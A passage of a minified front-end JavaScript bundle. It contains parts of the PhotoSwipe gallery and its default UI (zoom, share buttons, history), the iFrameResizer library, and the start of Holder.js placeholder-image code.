h=o.createEl(d,l.msrc?"img":"");l.msrc&&(h.src=l.msrc),Jt(l,h),c.appendChild(h),l.placeholder=h}l.loading||Gt(l),r.allowProgressiveImg()&&(!Ft&&R.transform?Vt.push({item:l,baseDiv:c,img:l.img,index:t,holder:e}):Yt(0,l,c,l.img,0,!0))}Ft||t!==u?Oe(l):(te=c.style,zt(l,i||l.img)),e.el.innerHTML="",e.el.appendChild(c)}else e.el.innerHTML=""},cleanSlide:function(e){e.img&&(e.img.onload=e.img.onerror=null),e.loaded=e.loading=e.img=e.imageAppended=!1}}});var Xt,Qt,en={},tn=function(e,t,n){var i=document.createEvent("CustomEvent"),o={origEvent:e,target:e.target,releasePoint:t,pointerType:n||"touch"};i.initCustomEvent("pswpTap",!0,!0,o),e.target.dispatchEvent(i)};we("Tap",{publicMethods:{initTap:function(){Ce("firstTouchStart",r.onTapStart),Ce("touchRelease",r.onTapRelease),Ce("destroy",(function(){en={},Xt=null}))},onTapStart:function(e){e.length>1&&(clearTimeout(Xt),Xt=null)},onTapRelease:function(e,t){if(t&&!G&&!$&&!$e){var n=t;if(Xt&&(clearTimeout(Xt),Xt=null,function(e,t){return Math.abs(e.x-t.x)<25&&Math.abs(e.y-t.y)<25}(n,en)))return void xe("doubleTap",n);if("mouse"===t.type)return void tn(e,t,"mouse");if("BUTTON"===e.target.tagName.toUpperCase()||o.hasClass(e.target,"pswp__single-tap"))return void tn(e,t);Me(en,n),Xt=setTimeout((function(){tn(e,t),Xt=null}),300)}}}}),we("DesktopZoom",{publicMethods:{initDesktopZoom:function(){L||(O?Ce("mouseUsed",(function(){r.setupDesktopZoom()})):r.setupDesktopZoom(!0))},setupDesktopZoom:function(t){Qt={};var n="wheel mousewheel DOMMouseScroll";Ce("bindEvents",(function(){o.bind(e,n,r.handleMouseWheel)})),Ce("unbindEvents",(function(){Qt&&o.unbind(e,n,r.handleMouseWheel)})),r.mouseZoomedIn=!1;var i,a=function(){r.mouseZoomedIn&&(o.removeClass(e,"pswp--zoomed-in"),r.mouseZoomedIn=!1),g<1?o.addClass(e,"pswp--zoom-allowed"):o.removeClass(e,"pswp--zoom-allowed"),s()},s=function(){i&&(o.removeClass(e,"pswp--dragging"),i=!1)};Ce("resize",a),Ce("afterChange",a),Ce("pointerDown",(function(){r.mouseZoomedIn&&(i=!0,o.addClass(e,"pswp--dragging"))})),Ce("pointerUp",s),t||a()},handleMouseWheel:function(e){if(g<=r.currItem.fitRatio)return a.modal&&(!a.closeOnScroll||$e||q?e.preventDefault():T&&Math.abs(e.deltaY)>2&&(c=!0,r.close())),!0;if(e.stopPropagation(),Qt.x=0,"deltaX"in e)1===e.deltaMode?(Qt.x=18*e.deltaX,Qt.y=18*e.deltaY):(Qt.x=e.deltaX,Qt.y=e.deltaY);else if("wheelDelta"in e)e.wheelDeltaX&&(Qt.x=-.16*e.wheelDeltaX),e.wheelDeltaY?Qt.y=-.16*e.wheelDeltaY:Qt.y=-.16*e.wheelDelta;else{if(!("detail"in e))return;Qt.y=e.detail}Fe(g,!0);var t=de.x-Qt.x,n=de.y-Qt.y;(a.modal||t<=ee.min.x&&t>=ee.max.x&&n<=ee.min.y&&n>=ee.max.y)&&e.preventDefault(),r.panTo(t,n)},toggleDesktopZoom:function(t){t=t||{x:he.x/2+fe.x,y:he.y/2+fe.y};var n=a.getDoubleTapZoom(!0,r.currItem),i=g===n;r.mouseZoomedIn=!i,r.zoomTo(i?r.currItem.initialZoomLevel:n,t,333),o[(i?"remove":"add")+"Class"](e,"pswp--zoomed-in")}}});var nn,on,rn,an,sn,ln,cn,un,dn,hn,pn,fn,mn={history:!0,galleryUID:1},gn=function(){return pn.hash.substring(1)},vn=function(){nn&&clearTimeout(nn),rn&&clearTimeout(rn)},yn=function(){var e=gn(),t={};if(e.length<5)return t;var n,i=e.split("&");for(n=0;n<i.length;n++)if(i[n]){var o=i[n].split("=");o.length<2||(t[o[0]]=o[1])}if(a.galleryPIDs){var r=t.pid;for(t.pid=0,n=0;n<Rt.length;n++)if(Rt[n].pid===r){t.pid=n;break}}else t.pid=parseInt(t.pid,10)-1;return t.pid<0&&(t.pid=0),t},_n=function(){if(rn&&clearTimeout(rn),$e||q)rn=setTimeout(_n,500);else{an?clearTimeout(on):an=!0;var e=u+1,t=Ht(u);t.hasOwnProperty("pid")&&(e=t.pid);var n=cn+"&gid="+a.galleryUID+"&pid="+e;un||-1===pn.hash.indexOf(n)&&(hn=!0);var i=pn.href.split("#")[0]+"#"+n;fn?"#"+n!==window.location.hash&&history[un?"replaceState":"pushState"]("",document.title,i):un?pn.replace(i):pn.hash=n,un=!0,on=setTimeout((function(){an=!1}),60)}};we("History",{publicMethods:{initHistory:function(){if(o.extend(a,mn,!0),a.history){pn=window.location,hn=!1,dn=!1,un=!1,cn=gn(),fn="pushState"in history,cn.indexOf("gid=")>-1&&(cn=(cn=cn.split("&gid=")[0]).split("?gid=")[0]),Ce("afterChange",r.updateURL),Ce("unbindEvents",(function(){o.unbind(window,"hashchange",r.onHashChange)}));var e=function(){ln=!0,dn||(hn?history.back():cn?pn.hash=cn:fn?history.pushState("",document.title,pn.pathname+pn.search):pn.hash=""),vn()};Ce("unbindEvents",(function(){c&&e()})),Ce("destroy",(function(){ln||e()})),Ce("firstUpdate",(function(){u=yn().pid}));var t=cn.indexOf("pid=");t>-1&&("&"===(cn=cn.substring(0,t)).slice(-1)&&(cn=cn.slice(0,-1))),setTimeout((function(){s&&o.bind(window,"hashchange",r.onHashChange)}),40)}},onHashChange:function(){return gn()===cn?(dn=!0,void r.close()):void(an||(sn=!0,r.goTo(yn().pid),sn=!1))},updateURL:function(){vn(),sn||(un?nn=setTimeout(_n,800):_n())}}}),o.extend(r,Ke)}})),function(e,t){"function"==typeof define&&define.amd?define(t):"object"==typeof exports?module.exports=t():e.PhotoSwipeUI_Default=t()}(this,(function(){"use strict";return function(e,t){var n,i,o,r,a,s,l,c,u,d,h,p,f,m,g,v,y,_,b=this,w=!1,k=!0,I=!0,C={barsSize:{top:44,bottom:"auto"},closeElClasses:["item","caption","zoom-wrap","ui","top-bar"],timeToIdle:4e3,timeToIdleOutside:1e3,loadingIndicatorDelay:1e3,addCaptionHTMLFn:function(e,t){return e.title?(t.children[0].innerHTML=e.title,!0):(t.children[0].innerHTML="",!1)},closeEl:!0,captionEl:!0,fullscreenEl:!0,zoomEl:!0,shareEl:!0,counterEl:!0,arrowEl:!0,preloaderEl:!0,tapToClose:!1,tapToToggleControls:!0,clickToCloseNonZoomable:!0,shareButtons:[{id:"facebook",label:"Share on Facebook",url:"https://www.facebook.com/sharer/sharer.php?u={{url}}"},{id:"twitter",label:"Tweet",url:"https://twitter.com/intent/tweet?text={{text}}&url={{url}}"},{id:"pinterest",label:"Pin it",url:"http://www.pinterest.com/pin/create/button/?url={{url}}&media={{image_url}}&description={{text}}"},{id:"download",label:"Download image",url:"{{raw_image_url}}",download:!0}],getImageURLForShare:function(){return e.currItem.src||""},getPageURLForShare:function(){return window.location.href},getTextForShare:function(){return e.currItem.title||""},indexIndicatorSep:" / ",fitControlsWidth:1200},x=function(e){if(v)return!0;e=e||window.event,g.timeToIdle&&g.mouseUsed&&!u&&L();for(var n,i,o=(e.target||e.srcElement).getAttribute("class")||"",r=0;r<j.length;r++)(n=j[r]).onTap&&o.indexOf("pswp__"+n.name)>-1&&(n.onTap(),i=!0);if(i){e.stopPropagation&&e.stopPropagation(),v=!0;var a=t.features.isOldAndroid?600:30;setTimeout((function(){v=!1}),a)}},S=function(){return!e.likelyTouchDevice||g.mouseUsed||screen.width>g.fitControlsWidth},E=function(e,n,i){t[(i?"add":"remove")+"Class"](e,"pswp__"+n)},T=function(){var e=1===g.getNumItemsFn();e!==m&&(E(i,"ui--one-slide",e),m=e)},A=function(){E(l,"share-modal--hidden",I)},O=function(){return(I=!I)?(t.removeClass(l,"pswp__share-modal--fade-in"),setTimeout((function(){I&&A()}),300)):(A(),setTimeout((function(){I||t.addClass(l,"pswp__share-modal--fade-in")}),30)),I||P(),!1},D=function(t){var n=(t=t||window.event).target||t.srcElement;return e.shout("shareLinkClick",t,n),!(!n.href||!n.hasAttribute("download")&&(window.open(n.href,"pswp_share","scrollbars=yes,resizable=yes,toolbar=no,location=yes,width=550,height=420,top=100,left="+(window.screen?Math.round(screen.width/2-275):100)),I||O(),1))},P=function(){for(var e,t,n,i,o="",r=0;r<g.shareButtons.length;r++)e=g.shareButtons[r],t=g.getImageURLForShare(e),n=g.getPageURLForShare(e),i=g.getTextForShare(e),o+='<a href="'+e.url.replace("{{url}}",encodeURIComponent(n)).replace("{{image_url}}",encodeURIComponent(t)).replace("{{raw_image_url}}",t).replace("{{text}}",encodeURIComponent(i))+'" target="_blank" class="pswp__share--'+e.id+'"'+(e.download?"download":"")+">"+e.label+"</a>",g.parseShareButtonOut&&(o=g.parseShareButtonOut(e,o));l.children[0].innerHTML=o,l.children[0].onclick=D},N=function(e){for(var n=0;n<g.closeElClasses.length;n++)if(t.hasClass(e,"pswp__"+g.closeElClasses[n]))return!0},M=0,L=function(){clearTimeout(_),M=0,u&&b.setIdle(!1)},U=function(e){var t=(e=e||window.event).relatedTarget||e.toElement;t&&"HTML"!==t.nodeName||(clearTimeout(_),_=setTimeout((function(){b.setIdle(!0)}),g.timeToIdleOutside))},R=function(e){p!==e&&(E(h,"preloader--active",!e),p=e)},F=function(e){var n=e.vGap;if(S()){var a=g.barsSize;if(g.captionEl&&"auto"===a.bottom)if(r||((r=t.createEl("pswp__caption pswp__caption--fake")).appendChild(t.createEl("pswp__caption__center")),i.insertBefore(r,o),t.addClass(i,"pswp__ui--fit")),g.addCaptionHTMLFn(e,r,!0)){var s=r.clientHeight;n.bottom=parseInt(s,10)||44}else n.bottom=a.top;else n.bottom="auto"===a.bottom?0:a.bottom;n.top=a.top}else n.top=n.bottom=0},j=[{name:"caption",option:"captionEl",onInit:function(e){o=e}},{name:"share-modal",option:"shareEl",onInit:function(e){l=e},onTap:function(){O()}},{name:"button--share",option:"shareEl",onInit:function(e){s=e},onTap:function(){O()}},{name:"button--zoom",option:"zoomEl",onTap:e.toggleDesktopZoom},{name:"counter",option:"counterEl",onInit:function(e){a=e}},{name:"button--close",option:"closeEl",onTap:e.close},{name:"button--arrow--left",option:"arrowEl",onTap:e.prev},{name:"button--arrow--right",option:"arrowEl",onTap:e.next},{name:"button--fs",option:"fullscreenEl",onTap:function(){n.isFullscreen()?n.exit():n.enter()}},{name:"preloader",option:"preloaderEl",onInit:function(e){h=e}}];b.init=function(){t.extend(e.options,C,!0),g=e.options,i=t.getChildByClass(e.scrollWrap,"pswp__ui"),d=e.listen,function(){var e;d("onVerticalDrag",(function(e){k&&e<.95?b.hideControls():!k&&e>=.95&&b.showControls()})),d("onPinchClose",(function(t){k&&t<.9?(b.hideControls(),e=!0):e&&!k&&t>.9&&b.showControls()})),d("zoomGestureEnded",(function(){(e=!1)&&!k&&b.showControls()}))}(),d("beforeChange",b.update),d("doubleTap",(function(t){var n=e.currItem.initialZoomLevel;e.getZoomLevel()!==n?e.zoomTo(n,t,333):e.zoomTo(g.getDoubleTapZoom(!1,e.currItem),t,333)})),d("preventDragEvent",(function(e,t,n){var i=e.target||e.srcElement;i&&i.getAttribute("class")&&e.type.indexOf("mouse")>-1&&(i.getAttribute("class").indexOf("__caption")>0||/(SMALL|STRONG|EM)/i.test(i.tagName))&&(n.prevent=!1)})),d("bindEvents",(function(){t.bind(i,"pswpTap click",x),t.bind(e.scrollWrap,"pswpTap",b.onGlobalTap),e.likelyTouchDevice||t.bind(e.scrollWrap,"mouseover",b.onMouseOver)})),d("unbindEvents",(function(){I||O(),y&&clearInterval(y),t.unbind(document,"mouseout",U),t.unbind(document,"mousemove",L),t.unbind(i,"pswpTap click",x),t.unbind(e.scrollWrap,"pswpTap",b.onGlobalTap),t.unbind(e.scrollWrap,"mouseover",b.onMouseOver),n&&(t.unbind(document,n.eventK,b.updateFullscreen),n.isFullscreen()&&(g.hideAnimationDuration=0,n.exit()),n=null)})),d("destroy",(function(){g.captionEl&&(r&&i.removeChild(r),t.removeClass(o,"pswp__caption--empty")),l&&(l.children[0].onclick=null),t.removeClass(i,"pswp__ui--over-close"),t.addClass(i,"pswp__ui--hidden"),b.setIdle(!1)})),g.showAnimationDuration||t.removeClass(i,"pswp__ui--hidden"),d("initialZoomIn",(function(){g.showAnimationDuration&&t.removeClass(i,"pswp__ui--hidden")})),d("initialZoomOut",(function(){t.addClass(i,"pswp__ui--hidden")})),d("parseVerticalMargin",F),function(){var e,n,o,r=function(i){if(i)for(var r=i.length,a=0;a<r;a++){e=i[a],n=e.className;for(var s=0;s<j.length;s++)o=j[s],n.indexOf("pswp__"+o.name)>-1&&(g[o.option]?(t.removeClass(e,"pswp__element--disabled"),o.onInit&&o.onInit(e)):t.addClass(e,"pswp__element--disabled"))}};r(i.children);var a=t.getChildByClass(i,"pswp__top-bar");a&&r(a.children)}(),g.shareEl&&s&&l&&(I=!0),T(),g.timeToIdle&&d("mouseUsed",(function(){t.bind(document,"mousemove",L),t.bind(document,"mouseout",U),y=setInterval((function(){2==++M&&b.setIdle(!0)}),g.timeToIdle/2)})),g.fullscreenEl&&!t.features.isOldAndroid&&(n||(n=b.getFullscreenAPI()),n?(t.bind(document,n.eventK,b.updateFullscreen),b.updateFullscreen(),t.addClass(e.template,"pswp--supports-fs")):t.removeClass(e.template,"pswp--supports-fs")),g.preloaderEl&&(R(!0),d("beforeChange",(function(){clearTimeout(f),f=setTimeout((function(){e.currItem&&e.currItem.loading?(!e.allowProgressiveImg()||e.currItem.img&&!e.currItem.img.naturalWidth)&&R(!1):R(!0)}),g.loadingIndicatorDelay)})),d("imageLoadComplete",(function(t,n){e.currItem===n&&R(!0)})))},b.setIdle=function(e){u=e,E(i,"ui--idle",e)},b.update=function(){k&&e.currItem?(b.updateIndexIndicator(),g.captionEl&&(g.addCaptionHTMLFn(e.currItem,o),E(o,"caption--empty",!e.currItem.title)),w=!0):w=!1,I||O(),T()},b.updateFullscreen=function(i){i&&setTimeout((function(){e.setScrollOffset(0,t.getScrollY())}),50),t[(n.isFullscreen()?"add":"remove")+"Class"](e.template,"pswp--fs")},b.updateIndexIndicator=function(){g.counterEl&&(a.innerHTML=e.getCurrentIndex()+1+g.indexIndicatorSep+g.getNumItemsFn())},b.onGlobalTap=function(n){var i=(n=n||window.event).target||n.srcElement;if(!v)if(n.detail&&"mouse"===n.detail.pointerType){if(N(i))return void e.close();t.hasClass(i,"pswp__img")&&(1===e.getZoomLevel()&&e.getZoomLevel()<=e.currItem.fitRatio?g.clickToCloseNonZoomable&&e.close():e.toggleDesktopZoom(n.detail.releasePoint))}else if(g.tapToToggleControls&&(k?b.hideControls():b.showControls()),g.tapToClose&&(t.hasClass(i,"pswp__img")||N(i)))return void e.close()},b.onMouseOver=function(e){var t=(e=e||window.event).target||e.srcElement;E(i,"ui--over-close",N(t))},b.hideControls=function(){t.addClass(i,"pswp__ui--hidden"),k=!1},b.showControls=function(){k=!0,w||b.update(),t.removeClass(i,"pswp__ui--hidden")},b.supportsFullscreen=function(){var e=document;return!!(e.exitFullscreen||e.mozCancelFullScreen||e.webkitExitFullscreen||e.msExitFullscreen)},b.getFullscreenAPI=function(){var t,n=document.documentElement,i="fullscreenchange";return n.requestFullscreen?t={enterK:"requestFullscreen",exitK:"exitFullscreen",elementK:"fullscreenElement",eventK:i}:n.mozRequestFullScreen?t={enterK:"mozRequestFullScreen",exitK:"mozCancelFullScreen",elementK:"mozFullScreenElement",eventK:"moz"+i}:n.webkitRequestFullscreen?t={enterK:"webkitRequestFullscreen",exitK:"webkitExitFullscreen",elementK:"webkitFullscreenElement",eventK:"webkit"+i}:n.msRequestFullscreen&&(t={enterK:"msRequestFullscreen",exitK:"msExitFullscreen",elementK:"msFullscreenElement",eventK:"MSFullscreenChange"}),t&&(t.enter=function(){return c=g.closeOnScroll,g.closeOnScroll=!1,"webkitRequestFullscreen"!==this.enterK?e.template[this.enterK]():void e.template[this.enterK](Element.ALLOW_KEYBOARD_INPUT)},t.exit=function(){return g.closeOnScroll=c,document[this.exitK]()},t.isFullscreen=function(){return document[this.elementK]}),t}}})),function(e){"use strict";function t(e,t,n){"addEventListener"in window?e.addEventListener(t,n,!1):"attachEvent"in window&&e.attachEvent("on"+t,n)}function n(e,t,n){"removeEventListener"in window?e.removeEventListener(t,n,!1):"detachEvent"in window&&e.detachEvent("on"+t,n)}function i(e){return D+"["+function(e){var t="Host page: "+e;return window.top!==window.self&&(t=window.parentIFrame&&window.parentIFrame.getId?window.parentIFrame.getId()+": "+e:"Nested host page: "+e),t}(e)+"]"}function o(e){return U[e]?U[e].log:T}function r(e,t){l("log",e,t,o(e))}function a(e,t){l("info",e,t,o(e))}function s(e,t){l("warn",e,t,!0)}function l(e,t,n,o){!0===o&&"object"==typeof window.console&&console[e](i(t),n)}function c(e){function i(){o("Height"),o("Width"),v((function(){g(S),p(E),C("resizedCallback",S)}),S,"init")}function o(e){var t=Number(U[E]["max"+e]),n=Number(U[E]["min"+e]),i=e.toLowerCase(),o=Number(S[i]);r(E,"Checking "+i+" is in range "+n+"-"+t),o<n&&(o=n,r(E,"Set "+i+" to min value")),o>t&&(o=t,r(E,"Set "+i+" to max value")),S[i]=""+o}function l(e){return x.substr(x.indexOf(":")+O+e)}function c(e,t){w((function(){y("Send Page Info","pageInfo:"+function(){var e=document.body.getBoundingClientRect(),t=S.iframe.getBoundingClientRect();return JSON.stringify({iframeHeight:t.height,iframeWidth:t.width,clientHeight:Math.max(document.documentElement.clientHeight,window.innerHeight||0),clientWidth:Math.max(document.documentElement.clientWidth,window.innerWidth||0),offsetTop:parseInt(t.top-e.top,10),offsetLeft:parseInt(t.left-e.left,10),scrollTop:window.pageYOffset,scrollLeft:window.pageXOffset})}(),e,t)}),32)}function b(e){var t=e.getBoundingClientRect();return h(E),{x:Math.floor(Number(t.left)+Number(N.x)),y:Math.floor(Number(t.top)+Number(N.y))}}function k(e){var t=e?b(S.iframe):{x:0,y:0},n={x:Number(S.width)+t.x,y:Number(S.height)+t.y};r(E,"Reposition requested from iFrame (offset x:"+t.x+" y:"+t.y+")"),window.top!==window.self?window.parentIFrame?window.parentIFrame["scrollTo"+(e?"Offset":"")](n.x,n.y):s(E,"Unable to scroll to requested position, window.parentIFrame not found"):(N=n,I(),r(E,"--"))}function I(){!1!==C("scrollCallback",N)?p(E):f()}function C(e,t){return u(E,e,t)}var x=e.data,S={},E=null;"[iFrameResizerChild]Ready"===x?function(){for(var e in U)y("iFrame requested init",_(e),document.getElementById(e),e)}():D===(""+x).substr(0,P)&&x.substr(P).split(":")[0]in U?(S=function(){var e=x.substr(P).split(":");return{iframe:U[e[0]]&&U[e[0]].iframe,id:e[0],height:e[1],width:e[2],type:e[3]}}(),E=S.id,U[E]&&(U[E].loaded=!0),!function(){var e=S.type in{true:1,false:1,undefined:1};return e&&r(E,"Ignoring init message from meta parent page"),e}()&&function(e){var t=!0;return U[e]||(t=!1,s(S.type+" No settings for "+e+". Message was: "+x)),t}(E)&&(r(E,"Received: "+x),function(){var e=!0;return null===S.iframe&&(s(E,"IFrame ("+S.id+") not found"),e=!1),e}()&&function(){var t=e.origin,n=U[E]&&U[E].checkOrigin;if(n&&""+t!="null"&&!(n.constructor===Array?function(){var e=0,i=!1;for(r(E,"Checking connection is from allowed list of origins: "+n);e<n.length;e++)if(n[e]===t){i=!0;break}return i}():function(){var e=U[E]&&U[E].remoteHost;return r(E,"Checking connection is from: "+e),t===e}()))throw new Error("Unexpected message received from: "+t+" for "+S.iframe.id+". Message was: "+e.data+". This error can be disabled by setting the checkOrigin: false option or by providing of array of trusted domains.");return!0}()&&function(){switch(U[E]&&U[E].firstRun&&(U[E]&&(U[E].firstRun=!1)),S.type){case"close":U[E].closeRequestCallback?u(E,"closeRequestCallback",U[E].iframe):d(S.iframe);break;case"message":!function(e){r(E,"MessageCallback passed: {iframe: "+S.iframe.id+", message: "+e+"}"),C("messageCallback",{iframe:S.iframe,message:JSON.parse(e)}),r(E,"--")}(l(6));break;case"scrollTo":k(!1);break;case"scrollToOffset":k(!0);break;case"pageInfo":c(U[E]&&U[E].iframe,E),function(){function e(e,t){function n(){U[o]?c(U[o].iframe,o):i()}["scroll","resize"].forEach((function(i){r(o,e+i+" listener for sendPageInfo"),t(window,i,n)}))}function i(){e("Remove ",n)}var o=E;e("Add ",t),U[o]&&(U[o].stopPageInfo=i)}();break;case"pageInfoStop":U[E]&&U[E].stopPageInfo&&(U[E].stopPageInfo(),delete U[E].stopPageInfo);break;case"inPageLink":!function(e){var t=e.split("#")[1]||"",n=decodeURIComponent(t),i=document.getElementById(n)||document.getElementsByName(n)[0];i?function(){var e=b(i);r(E,"Moving to in page link (#"+t+") at x: "+e.x+" y: "+e.y),N={x:e.x,y:e.y},I(),r(E,"--")}():window.top!==window.self?window.parentIFrame?window.parentIFrame.moveToAnchor(t):r(E,"In page link #"+t+" not found and window.parentIFrame not found"):r(E,"In page link #"+t+" not found")}(l(9));break;case"reset":m(S);break;case"init":i(),C("initCallback",S.iframe);break;default:i()}}())):a(E,"Ignored: "+x)}function u(e,t,n){var i=null,o=null;if(U[e]){if("function"!=typeof(i=U[e][t]))throw new TypeError(t+" on iFrame["+e+"] is not a function");o=i(n)}return o}function d(e){var t=e.id;r(t,"Removing iFrame: "+t),e.parentNode&&e.parentNode.removeChild(e),u(t,"closedCallback",t),r(t,"--"),delete U[t]}function h(t){null===N&&r(t,"Get page position: "+(N={x:window.pageXOffset!==e?window.pageXOffset:document.documentElement.scrollLeft,y:window.pageYOffset!==e?window.pageYOffset:document.documentElement.scrollTop}).x+","+N.y)}function p(e){null!==N&&(window.scrollTo(N.x,N.y),r(e,"Set page position: "+N.x+","+N.y),f())}function f(){N=null}function m(e){r(e.id,"Size reset requested by "+("init"===e.type?"host page":"iFrame")),h(e.id),v((function(){g(e),y("reset","reset",e.iframe,e.id)}),e,"reset")}function g(e){function t(t){e.iframe.style[t]=e[t]+"px",r(e.id,"IFrame ("+o+") "+t+" set to "+e[t]+"px")}function n(t){A||"0"!==e[t]||(A=!0,r(o,"Hidden iFrame detected, creating visibility listener"),function(){function e(){function e(e){function t(t){return"0px"===(U[e]&&U[e].iframe.style[t])}function n(e){return null!==e.offsetParent}U[e]&&n(U[e].iframe)&&(t("height")||t("width"))&&y("Visibility change","resize",U[e].iframe,e)}for(var t in U)e(t)}function t(t){r("window","Mutation observed: "+t[0].target+" "+t[0].type),w(e,16)}function n(){var e=document.querySelector("body"),n={attributes:!0,attributeOldValue:!1,characterData:!0,characterDataOldValue:!1,childList:!0,subtree:!0};new i(t).observe(e,n)}var i=window.MutationObserver||window.WebKitMutationObserver;i&&n()}())}function i(e){t(e),n(e)}var o=e.iframe.id;U[o]&&(U[o].sizeHeight&&i("height"),U[o].sizeWidth&&i("width"))}function v(e,t,n){n!==t.type&&M?(r(t.id,"Requesting animation frame"),M(e)):e()}function y(e,t,n,i,o){var a=!1;i=i||n.id,U[i]&&(n&&"contentWindow"in n&&null!==n.contentWindow?function(){var o=U[i]&&U[i].targetOrigin;r(i,"["+e+"] Sending msg to iframe["+i+"] ("+t+") targetOrigin: "+o),n.contentWindow.postMessage(D+t,o)}():s(i,"["+e+"] IFrame("+i+") not found"),o&&U[i]&&U[i].warningTimeout&&(U[i].msgTimeout=setTimeout((function(){!U[i]||U[i].loaded||a||(a=!0,s(i,"IFrame has not responded within "+U[i].warningTimeout/1e3+" seconds. Check iFrameResizer.contentWindow.js has been loaded in iFrame. This message can be ingored if everything is working, or you can set the warningTimeout option to a higher value or zero to suppress this warning."))}),U[i].warningTimeout)))}function _(e){return e+":"+U[e].bodyMarginV1+":"+U[e].sizeWidth+":"+U[e].log+":"+U[e].interval+":"+U[e].enablePublicMethods+":"+U[e].autoResize+":"+U[e].bodyMargin+":"+U[e].heightCalculationMethod+":"+U[e].bodyBackground+":"+U[e].bodyPadding+":"+U[e].tolerance+":"+U[e].inPageLinks+":"+U[e].resizeFrom+":"+U[e].widthCalculationMethod}function b(n,i){var o=function(e){return e,""===e&&(n.id=e=function(){var e=i&&i.id||F.id+E++;return null!==document.getElementById(e)&&(e+=E++),e}(),T=(i||{}).log,e,r(e,"Added missing iframe ID: "+e+" ("+n.src+")")),e}(n.id);o in U&&"iFrameResizer"in n?s(o,"Ignored iFrame, already setup."):(function(e){e=e||{},U[o]={firstRun:!0,iframe:n,remoteHost:n.src.split("/").slice(0,3).join("/")},function(e){if("object"!=typeof e)throw new TypeError("Options is not an object")}(e),function(e){for(var t in F)F.hasOwnProperty(t)&&(U[o][t]=e.hasOwnProperty(t)?e[t]:F[t])}(e),U[o]&&(U[o].targetOrigin=!0===U[o].checkOrigin?function(e){return""===e||"file://"===e?"*":e}(U[o].remoteHost):"*")}(i),function(){switch(r(o,"IFrame scrolling "+(U[o]&&U[o].scrolling?"enabled":"disabled")+" for "+o),n.style.overflow=!1===(U[o]&&U[o].scrolling)?"hidden":"auto",U[o]&&U[o].scrolling){case!0:n.scrolling="yes";break;case!1:n.scrolling="no";break;default:n.scrolling=U[o]?U[o].scrolling:"no"}}(),function(){function e(e){1/0!==U[o][e]&&0!==U[o][e]&&(n.style[e]=U[o][e]+"px",r(o,"Set "+e+" = "+U[o][e]+"px"))}function t(e){if(U[o]["min"+e]>U[o]["max"+e])throw new Error("Value for min"+e+" can not be greater than max"+e)}t("Height"),t("Width"),e("maxHeight"),e("minHeight"),e("maxWidth"),e("minWidth")}(),"number"!=typeof(U[o]&&U[o].bodyMargin)&&"0"!==(U[o]&&U[o].bodyMargin)||(U[o].bodyMarginV1=U[o].bodyMargin,U[o].bodyMargin=U[o].bodyMargin+"px"),function(i){t(n,"load",(function(){y("iFrame.onload",i,n,e,!0),function(){var e=U[o]&&U[o].firstRun,t=U[o]&&U[o].heightCalculationMethod in L;!e&&t&&m({iframe:n,height:0,width:0,type:"init"})}()})),y("init",i,n,e,!0)}(_(o)),Function.prototype.bind&&U[o]&&(U[o].iframe.iFrameResizer={close:d.bind(null,U[o].iframe),resize:y.bind(null,"Window resize","resize",U[o].iframe),moveToAnchor:function(e){y("Move to anchor","moveToAnchor:"+e,U[o].iframe,o)},sendMessage:function(e){y("Send Message","message:"+(e=JSON.stringify(e)),U[o].iframe,o)}}))}function w(e,t){null===R&&(R=setTimeout((function(){R=null,e()}),t))}function k(e){r("window","Trigger event: "+e),w((function(){C("Window "+e,"resize")}),16)}function I(){"hidden"!==document.visibilityState&&(r("document","Trigger event: Visiblity change"),w((function(){C("Tab Visable","resize")}),16))}function C(e,t){function n(e){return U[e]&&"parent"===U[e].resizeFrom&&U[e].autoResize&&!U[e].firstRun}for(var i in U)n(i)&&y(e,t,document.getElementById(i),i)}function x(){t(window,"message",c),t(window,"resize",(function(){k("resize")})),t(document,"visibilitychange",I),t(document,"-webkit-visibilitychange",I),t(window,"focusin",(function(){k("focus")})),t(window,"focus",(function(){k("focus")}))}function S(){function t(e,t){t&&(function(){if(!t.tagName)throw new TypeError("Object is not a valid DOM element");if("IFRAME"!==t.tagName.toUpperCase())throw new TypeError("Expected <IFRAME> tag, found <"+t.tagName+">")}(),b(t,e),n.push(t))}var n;return function(){var e,t=["moz","webkit","o","ms"];for(e=0;e<t.length&&!M;e+=1)M=window[t[e]+"RequestAnimationFrame"];M||r("setup","RequestAnimationFrame not supported")}(),x(),function(i,o){switch(n=[],function(e){e&&e.enablePublicMethods&&s("enablePublicMethods option has been removed, public methods are now always available in the iFrame")}(i),typeof o){case"undefined":case"string":Array.prototype.forEach.call(document.querySelectorAll(o||"iframe"),t.bind(e,i));break;case"object":t(i,o);break;default:throw new TypeError("Unexpected data type ("+typeof o+")")}return n}}if("undefined"!=typeof window){var E=0,T=!1,A=!1,O="message".length,D="[iFrameSizer]",P=D.length,N=null,M=window.requestAnimationFrame,L={max:1,scroll:1,bodyScroll:1,documentElementScroll:1},U={},R=null,F={autoResize:!0,bodyBackground:null,bodyMargin:null,bodyMarginV1:8,bodyPadding:null,checkOrigin:!0,inPageLinks:!1,enablePublicMethods:!0,heightCalculationMethod:"bodyOffset",id:"iFrameResizer",interval:32,log:!1,maxHeight:1/0,maxWidth:1/0,minHeight:0,minWidth:0,resizeFrom:"parent",scrolling:!1,sizeHeight:!0,sizeWidth:!1,warningTimeout:5e3,tolerance:0,widthCalculationMethod:"scroll",closedCallback:function(){},initCallback:function(){},messageCallback:function(){s("MessageCallback function not defined")},resizedCallback:function(){},scrollCallback:function(){return!0}};window.jQuery&&function(e){e.fn?e.fn.iFrameResize||(e.fn.iFrameResize=function(e){return this.filter("iframe").each((function(t,n){b(n,e)})).end()}):a("","Unable to bind to jQuery, it is not fully loaded.")}(window.jQuery),"function"==typeof define&&define.amd?define([],S):"object"==typeof module&&"object"==typeof module.exports?module.exports=S():window.iFrameResize=window.iFrameResize||S()}}();var Holder=Holder||{};!function(e,t){function n(e){e=e.match(/^(\W)?(.*)/);var t=document["getElement"+(e[1]?"#"==e[1]?"ById":"sByClassName":"sByTagName")](e[2]),n=[];return null!=t&&(n=t.length||0==t.length?t:[t]),n}function o(e,t){var n={};for(var i in e)n[i]=e[i];for(var o in t)n[o]=t[o];return n}function r(e,t,n,i){var o=function(e,t,n){var i=[t,e].sort(),o=Math.round(i[1]/16);return{height:(Math.round(i[0]/16),Math.max(n.size,o))}}(t.width,t.height,n).height,r=t.width*i,a=t.height*i,s=n.font?n.font:"sans-serif";h.width=r,h.height=a,e.textAlign="center",e.textBaseline="middle",e.fillStyle=n.background,e.fillRect(0,0,r,a),e.fillStyle=n.foreground,e.font="bold "+o+"px "+s;var l=n.text?n.text:t.width+"x"+t.height;return 